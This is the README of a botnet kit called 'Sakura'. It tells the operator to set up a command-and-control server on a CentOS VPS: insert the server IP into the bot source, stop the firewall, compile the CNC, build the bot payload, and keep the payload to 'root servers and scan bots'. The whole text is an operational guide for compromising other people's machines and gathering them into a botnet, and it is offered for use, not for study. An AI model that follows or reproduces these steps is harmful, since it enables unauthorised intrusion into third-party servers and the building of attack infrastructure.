Everything You Need:

1. VPS CentOS 6 or 7
2. MobaXterm And PuTTY.
3. Another CentOS VPS In The Future For Scanning Bots.

Edit the Sakura_Bot.c file and find where it says "SERVERIP" and change it to your server IP.

Edit the Sakura_Login.txt file and replace where it says "USERNAME PASSWORD" to your user and pass.

Edit where it says "[SERVERIP]" below to your server IP.   *Make sure you also replace the brackets.

Drag all files into your server and run these commands...
--------------------------------------------------------------------
yum install python-paramiko nano screen gcc perl wget lbzip2 iptables-services unzip -y

service httpd restart; service iptables stop

gcc cnc -o Sakura -pthread

python Sakura_Build.py Sakura_Bot.c [SERVERIP]

screen ./Sakura 12345 1 54321

save payload 
--------------------------------------------------------------------
Now press ctrl-A+D   *If screen doesnt work then type "pkill screen" then try to screen again.

Copy your payload and save it somewhere safe so you can root servers and scan bots in the future.

Bot port is 12345, CNC port is 54321 and the connection type is RAW.

Type "screen -x" to see Sakura activity.

Make sure to check the Sakura_Logs.log file that will appear in your server to see all user logs.
